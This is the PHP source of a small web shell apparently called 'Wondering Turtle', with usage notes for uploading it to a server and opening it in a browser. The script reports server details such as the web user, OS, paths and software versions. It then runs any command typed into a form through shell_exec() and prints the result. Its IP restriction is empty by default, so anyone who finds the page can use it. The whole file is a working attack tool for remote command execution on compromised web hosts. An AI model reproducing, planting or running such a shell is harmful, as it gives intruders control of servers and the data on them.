<?php
/**
 * Wondering Turtle 
 * 
 * Quick and dirty example of running a shell inside php
 *
 * This started as a challenge to myself: could I write it or must I
 * google around for one of the usual fancy ones?
 * 
 * Usage:
 * 1. Upload it to a directory you have access to, noting its filename
 * 2. Point your browser to it. It should work with most browsers including
 * lynx
 *
 * Issues:
 * 0. Not very elegant code
 * 1. Depends on php
 * 2. Not encrypted
 * 3. Needs upload option
 *
 * 0.1.0 : initial version, just enough to get stuff done
 * 0.2.0 : o Replace system() with more php-specific ways to get info
 *         o Rewrite it so you can tell it to only create page if it is being
 *           accessed from your (external?) IP
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * 
 * @package   wondering-turtle
 * @author    Mauricio Tavares <raubvogel@gmail.com>
 * @copyright 2013 Mauricio Tavares
 * @license   GPL3
 * @link      https://github.com/raubvogel/wondering-turtle
 * @since     File availavle since release 0.2.0
 *
 */

/**
 * USER-customizable crap
 */
$safeIP = ""; // Only IP that can run this script from

/**
 * Useful info. Expand as needed
 *
 * Remember most of this should be printed in the table below
 */
$user = getenv('APACHE_RUN_USER'); // Web server user
$path = realpath(dirname(__FILE__)); // Path this script resides at
$os = php_uname('a');
$webserverversion = $_SERVER['SERVER_SOFTWARE'];
$phpver = phpversion();
$webhostname = $_SERVER['SERVER_NAME']; // Virtual hostname
$hostname = php_uname('n'); // SERVER hostname
$myname = $_SERVER['SCRIPT_NAME'] ; // What did you call this script over there
$userbrowser = $_SERVER['HTTP_USER_AGENT'] ; 
$useraddr = $_SERVER['REMOTE_ADDR']; // IP YOU are coming from

$header = <<<EOS
<html>
<head>
   <title>Wondering Turtle</title>
</head>
<body>
EOS;

$footer = <<<EOF
  </body>
</html>
EOF;

/**
 * Form where you enter your commands. 
 *
 * Of course, if this is running in a Windows box, you might not go very
 * far using Linux commands.
 */
$form = <<<EOF
   <form action="$myname" method="post">
      <p>Command: <input type="text" name="command" /></p>
      <p><input type="submit" /></p>
   </form>
EOF;

/**
 * Spit out some useful info about the webserver
 */
$info = <<<EOT
   <h3>General Information</h3>
   <table>
      <tr>
         <td>Web server user:</td>
         <td><pre>$user</pre></td>
      </tr>
      <tr>
         <td>os:</td> 
         <td><pre>$os</pre></td>
      </tr>
      <tr>
         <td>Path where I am at:</td>
         <td><pre>$path</pre></td>
      </tr>
      <tr>
         <td>Website's real hostname:</td>
         <td><pre>$hostname</pre></td>
      </tr>
      <tr>
         <td>Website's hostname:</td>
         <td><pre>$webhostname</pre></td>
      </tr>
      <tr>
         <td>Web server version:</td>
         <td><pre>$webserverversion</pre></td>
      </tr>
      <tr>
         <td>php version:</td>
         <td><pre>$phpver</pre></td>
      </tr>
      <tr>
         <td>YOUR IP:</td>
         <td><pre>$useraddr</pre></td>
      </tr>
      <tr>
         <td>YOUR browser:</td>
         <td><pre>$userbrowser</pre></td>
      </tr>
   </table>
EOT;

/**
 * Show the output of the command you entered in the form
 */
if (!empty($_POST)) {
   $input = $_POST['command'];
   $output = htmlspecialchars(shell_exec($_POST['command']));
   $command = <<<EOC
   <h3>Command</h3>
   <pre>$input</pre>
   <h3>Reply</h3>
   <pre>$output</pre>
EOC;
} 

/**
 * Only create page if safeIP is either undefined or matches your IP
 */
if ( empty($safeIP) || $safeIP == $useraddr){
   echo $header;
   echo $info;
   echo $form;
   echo $command;
   echo $footer;
}

?>

